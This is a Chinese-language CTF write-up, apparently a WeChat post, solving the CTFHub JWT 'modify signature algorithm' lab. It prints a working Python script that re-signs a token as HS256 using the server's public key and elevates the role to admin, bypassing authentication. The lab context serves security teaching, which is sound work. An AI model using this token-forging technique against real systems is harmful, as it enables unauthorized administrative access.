---
title: CTFHub：第八十五关——JSON Web Token——修改签名算法
url: https://mp.weixin.qq.com/s/dEEnp5bfuWxaK4fmJDQjKw
source: Doonsec's feed
date: 2026-07-14
fetch_date: 2026-07-15T04:41:59.480569
---

# CTFHub：第八十五关——JSON Web Token——修改签名算法

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/TkbqemjbpIo4hqGjq95Is990AqKCpzgPFo8ozKD01u5hp7T4qaicTkxzQwmXj6Cu0GQa10oAPyo3dLD3wbf7XoIR7dicSZqBYKCEPJsaQPiaPg/0?wx_fmt=jpeg)

# CTFHub：第八十五关——JSON Web Token——修改签名算法

原创

君陌社区
君陌社区

君陌社区渗透安全笔记

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

CTFHub网址:【https://www.ctfhub.com/#/index】

登录账号
点击技能树

选择“web进阶-JSON Web Token-修改签名算法”开启题目

题目描述: 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的

漏洞原理:服务器允许将非对称签名算法（RS256）改为对称算法（HS256），攻击者可直接使用公开的公钥作为对称密钥伪造管理员签名，从而绕过身份验证

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIp5ia2r3ccQSHMp9S5LMwwJP38WiaNJ57279iaL5ic0Tc0pkCicxh9OoRtQ2SNowajHUOuu2TcYhJlIO7GAAPVXcEhsHptuKT7HpFj8/640?wx_fmt=png)

单击打开链接进入靶场实战练习环境，显示了一个登陆页面和一段源码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIqCjHjgiaZTXbu6mhibF4ThDgoL6SxuwoCribtibbT6fmd8VEmz0VS93fTFx1DQiaxlSPR2Wss2Mp0Cqc9akWhghbXQPYVNnfUQp0rY/640?wx_fmt=png)

输入用户名admin，密码123456，点击登录，显示显示token和源码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIoBhg01crOqQCqHVkJzTbiaMF2ShRnxgzxhr4t6ZjjAaGAH3sMZJQthMiblj1kAFhYlD6oCG2YCsrMf0kPPKQOUw82WKSxtoJLm0/640?wx_fmt=png)

login报文，token的第一部分解密后为{"typ":"JWT","alg":"RS256"}

![](https://mmbiz.qpic.cn/mmbiz_png/TkbqemjbpIpTRsy0YxXhjIHxnMiarm1eGic5rGfwMsqBzKQuFLNwNE1SbCCEGuhqq2qwsMnUIpruicoW46DnCibbI82epyrZLsg0IfUALcOdP3g/640?wx_fmt=png)

index报文，token的第二部分解密后为{"username":"admin","role":"guest"}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIpoCgFUXmY4Uibcny2c7iaZAcf0JPwiahEhvr1fkNHaITzhadWxcoMfveUJDC1LuuDP4QYL8wttk4aNSaDJIX3vQ5KHn88yibPy2tc/640?wx_fmt=png)

将index报文发送到repeater

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIrfJKRny0CRaqktlTiaSRic7Tg3e1cLUAZOto3hOv0xw0moB97DzaFzhEwVQbCfazIkmD7jia5VyFXic65kcZ0cTAX3ATxrB9cjgW4/640?wx_fmt=png)

打开Json.cn网站，将token上传解密得到头部、载荷、私钥和公钥

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIoMH0HE045O1MxQKRMzjwF0aia7yOhSlZNcc9J9dzIvdeVDsHAkLTEaPQvJtURticokGBibk6q8nOMy8Tw1OicdEJHE5ZyjZb1j7sA/640?wx_fmt=png)

回到靶场练习实战环境登陆后页面下载publickey.pem

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIohZicMcWyWdZXxRF75nTDOcmzlQpibzxNpPcYNpHuAbRRBRvQqXMOXIvmmEonHgAskn4gpictNHyXh8vMur8PL0N6PVlUymmiclhY/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/TkbqemjbpIoHGFmOWXnOjdIj9pGlcpc1s6LXicnezvBzPIv7cl4ANaHicuicPUn0qhPibr9PPbecUzxkSmN9OtuVbKxe5wXickU36IbwMky1Gjw4/640?wx_fmt=png)

并将其放在与脚本用以目录下

![](https://mmbiz.qpic.cn/mmbiz_png/TkbqemjbpIpT43TOy9Fc25KoOBR0LicLDKr8ghELyFwicq4HPCCf3icd4quicnBypfNHJGkLnvq385AVvMRA5IicWHx1tXpncIUVIgsngZzjvlrQ/640?wx_fmt=png)

接下来使用脚本来完成token计算，代码如下所示。

第一部分依旧是{"typ":"JWT","alg":"RS256"}

将第二部分改为{"username":"admin","role":"admin"}

```
# 君陌社区# CTFHub：第八十五关——JSON Web Token——修改签名算法# coding=GBKimport hmacimport hashlibimport base64import requests
# 1. 下载公钥（如果尚未下载）# url = "http://challenge-<id>.ctfhub.com:port/publickey.pem"# r = requests.get(url)# with open("publickey.pem","wb") as f:#     f.write(r.content)
# 2. 读取公钥文件with open('publickey.pem', 'r') as f:    key = f.read()
# 3. 定义新的Header和Payload# 将算法改为HS256，角色改为adminheader = '{"typ": "JWT", "alg": "HS256"}'payload = '{"username": "admin", "role": "admin"}'
# 4. 进行Base64Url编码def base64url_encode(data):    return base64.urlsafe_b64encode(data.encode("utf-8")).decode("utf-8").rstrip("=")
encoded_header = base64url_encode(header)encoded_payload = base64url_encode(payload)
# 5. 拼接Token的前两部分token = encoded_header + "." + encoded_payload
# 6. 使用公钥作为HMAC的密钥，计算签名signature = base64.urlsafe_b64encode(    hmac.new(        bytes(key, "UTF-8"),        token.encode("utf-8"),        hashlib.sha256    ).digest()).decode("UTF-8").rstrip("=")
# 7. 组合成最终的JWTforged_token = token + "." + signatureprint(forged_token)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIpqK86cdgmobQ1o9tuN0LGzNkib64hLSWQv2AZicvBbxqr4U3s6fn93s79yHEXUAS2Uj1C4ZicYlfKEQzyfT6BSFgGYk4NxzghxUA/640?wx_fmt=png)

将生伪造的token输入到请求的token字段发送，得到flag数据

![](https://mmbiz.qpic.cn/mmbiz_png/TkbqemjbpIpVgyHSiaomV7PlGI0icqVfMjCTHkXJdD1DLbPNknkG5mAxZdE0HRNzTLiaz3IrribgycdGdEYl3t2wvtIkYFRZpDJWWXiacicYVrMw8/640?wx_fmt=png)

提交flag数据，完成靶场实战练习

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TkbqemjbpIqg6ZbVhYWungUAA9J6JFlfQWOVGPBanlOUjCjdm3KibJhNtvDdYBAQ4Nj4agticSmBApxBQRFf3CojHdbc0DDVx1Aj1ljtqiasnY/640?wx_fmt=png)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/csuE9m26HkI8taS28gIOWsc8KaibxmZ9HDovmlvGsicEnJuSw0Ricdq3KibbTUnRicEO0NohDyczWdgJBOe3RWF1tQw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过